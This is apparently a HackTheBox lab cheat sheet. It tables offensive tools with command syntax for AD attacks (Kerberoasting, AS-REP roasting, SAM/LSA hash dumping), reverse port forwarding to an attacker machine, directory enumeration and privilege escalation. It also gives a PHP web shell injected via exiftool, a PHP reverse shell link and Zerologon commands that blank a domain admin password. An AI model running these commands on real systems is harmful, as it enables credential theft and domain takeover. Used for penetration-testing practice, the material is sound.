# Tools


#### Windows and Active Directory
| Tool | Use | Command Syntax |
| ---- | --- | -------------- |
| [Bloodhound.py](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/BloodHound.py) | BloodHound written in python. Used to obtain AD infromations from a windows machine | `python3 bloodhound-python -u <username> -p <passphrase> -ns <machineIP> -d <domainname> -c all` |
| [Impackets](https://github.com/SecureAuthCorp/impacket) | Swiss Knife for most Windows AD attacks | `python GetNPUsers.py <domain_name>/ -usersfile <users_file>` = ASREPRoasting <br /> `python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password>` = Kerberoasting |
| [Kerbrute](https://github.com/ropnop/kerbrute) | A tool written in GO to enumerate AD users | `./kerbrute userenum --dc <machine ip> -d <doaminname> <users_file>` |
| [CredDump](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/creddump) | Used to obtain Cached Credentials, LSA Secrets and Password hash when system and sam files are available | `./pwdump.py <system hive> <sam hive>` = Obtain Password Credentials <br /> `./cachedump.py <system hive> <sam hive>` = obtain cached credentials <br /> `./lsadum.py <system hive> <sam hive>` = Obtain LSA Dumps |
| [PwdDump](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/pwdump) | After getting the `administrative` access, running this will get the password hashes | `.\PwDump7.exe`|
| [ApacheDirectoryStudio](https://directory.apache.org/studio/downloads.html) | LDAP browser which is used to analyze LDAP instance running on linux (CREDS required), here transferring the LDAP running on a victim machine and accessing it in the attacker machine | `sudo ssh -L 389:172.20.0.10:389 lynik-admin@10.10.10.189` |


#### Port Forwarding
| Tool | Use | Command Syntax|
| ---- | --- | -------------- |
| [Chisel](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/chisel) | Used to forward a service running on a port in the victim machine | `./chisel server -p <port no.> --revserse` = on the attacker machine <br /> `./chisel client <attackerip:port> R:1234:127.0.0.1:1121` = Forwards the service running on port 1121 to the port 1234 on attackers machine |
| [socat](https://github.com/craSH/socat) | Swiss Knife for Port forwarding | `socat TCP-LISTEN:8000,fork TCP:<machineIP>:<port>` = Listens on every connection to port `8000` and forwards to the `machineIP` and its `port` <br /> `socat TCP-LISTEN:9002,bind=<specific ip>,fork,reuseaddr TCP:localhost:<port>`|
| [plink](https://github.com/Plotkine/pentesting/blob/master/Windows_privilege_escalation/Windows-privesc-tib3rius/plink.exe) | SSH Putty in CLI mode | `.\plink.exe <user@host> -R <remote port>:<localhost>:<local port>` .\plink.exe kali@10.10.14.32 -R 8888:127.0.0.1:8888 = port forwards the service running on victim machines port 8888 to the attacker machines 8888 |


#### Directory Enumeration
| Tool | Use | Command Syntax |
| ---- | --- | -------------- |
| [DirSearch](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/dirsearch) | Directory enumeration Tool | `python3 dirsearch.py -u <url> -e <extn>` |
| [Gobuster](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/gobuster) | Directory enumeration tool written in GO | `gobuster dir -u <url> -w <wordlist> -x <extn> -b <hide status code> -t <threads>`|
| [RustBuster](https://github.com/phra/rustbuster)| Direcotry Enumeration tool written in rust |  `rustbuster dir -u <url> -w <wordlist> -e <extn>` |




#### Post Exploitation
| Tool | Use | Command Syntax |
| ---- | --- | -------------- |
| [LinEnum](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/LinEnum) | Post Enumeration scripts that automates enumeration | `./LinEnum.sh` |
| [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) | Post Enumeration Script | `./linpeas.sh` |
| [WinPEASbat/WinPEASexe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | Windows post enumeration script and exe | `.\winPEAS.bat` |


#### Misc
| Tool | Use | Command Syntax |
| ---- | --- | -------------- |
| [Exiftool](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/ExifTool) | Inspects the meta data of the image, Injects php payload in the comment section for file upload vulns, which can be added double extension `file.php.ext` | `./exiftool -Comment='<?php system($_GET['cmd']); ?>' <image.ext>`
| [Git Dumper](https://github.com/arthaud/git-dumper) | Dump the Github repo if found in website | `./git-dumper.py <website/.git> <output folder>` |
| [lxd-alpine builder](https://github.com/saghul/lxd-alpine-builder) | When a victim machine is implemented with lxc the privesc is done with this | [`article here`](https://www.hackingarticles.in/lxd-privilege-escalation/) |
| [Php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) | Php reverse shell, when an upload is possible change the IP and make req to obtain reverse shell | |
| [ZerologonPOC](https://github.com/risksense/zerologon) | CVE-2020-1472 Exploit, sets the domain admin password as empty pass and dump the secrets. _PS: Latest Version of Impackets is required_ | `python3 set_empty_pw.py machinename/domainname machine IP; secretsdump.py -just-dc -no-pass machinename\$@machineip`|
| [Gopherus](https://github.com/tarunkant/Gopherus) | SSRF with `gopher://` protocol | `gophreus --exploit phpmemcache` |
